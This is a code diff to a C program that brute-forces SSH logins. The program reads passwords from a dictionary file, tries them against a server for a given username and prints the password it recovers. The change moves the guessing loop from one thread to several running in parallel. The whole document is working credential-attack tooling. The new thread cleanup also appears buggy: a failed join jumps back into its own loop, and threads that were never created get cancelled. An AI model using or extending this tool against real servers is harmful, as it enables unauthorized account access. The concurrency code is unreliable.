@@ -2,6 +2,7 @@
 #include "tcp.h"
 #include "lines.h"
 #include "ssh.h"
+#include "memory.h"
 #include <unistd.h>
 #include <pthread.h>
 
@@ -143,25 +144,35 @@ status_t bruteforce (line_t (*password), int ssh_socket, const char* username, F
 	if (failed (status))
 		return status;
 
-	pthread_t thd;
+	pthread_t* threads;
+	status = typed_alloc (pthread_t, &threads, nthreads);
+	if (failed (status))
+		return status;
+
 	if (pthread_mutex_lock (&data.done_mutex) != 0)
 		return failure ("Failed to lock \"done\" mutex");
 	{
-		if (pthread_create (&thd, NULL, &bruteforce_thread, &data) != 0){
-			status = failure ("Failed to create bruteforce thread");
-			goto done;
+		for (int i = 0; i < nthreads; ++i) {
+			if (pthread_create (&threads [i], NULL, &bruteforce_thread, &data) != 0) {
+				status = failure ("Failed to create bruteforce thread");
+				goto done;
+			}
 		}
 
 		if (pthread_cond_wait (&data.done, &data.done_mutex) != 0) {
 			status = failure ("Failed to wait on \"done\"");
 			goto done;
 		}
+
+	done:
+		for (int i = 0; i < nthreads; ++i) {
+			pthread_cancel (threads [i]);
+			if (pthread_join (threads [i], NULL) != 0) {
+				status = failure ("Failed to join bruteforce thread");
+				goto done;
+			}
+		}
 	}
-done:
-	if (pthread_cancel (thd) != 0)
-		status = failure ("Failed to cancel bruteforce thread");
-	if (pthread_join (thd, NULL) != 0)
-		status = failure ("Failed to join bruteforce thread");
 	if (pthread_mutex_unlock (&data.done_mutex) != 0)
 		return failure ("Failed to unlock \"done\" mutex");
 	if (failed (status))
@@ -208,7 +219,7 @@ int main (int argc, const char* const* argv)
 	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);
 
 	line_t password;
-	check (bruteforce (&password, ssh_socket, username, dict_file, 1),
+	check (bruteforce (&password, ssh_socket, username, dict_file, 2),
 	       "Could not bruteforce ssh:%s@%s", username, address);
 
 	printf ("Password: %s\n", password.ntbs);
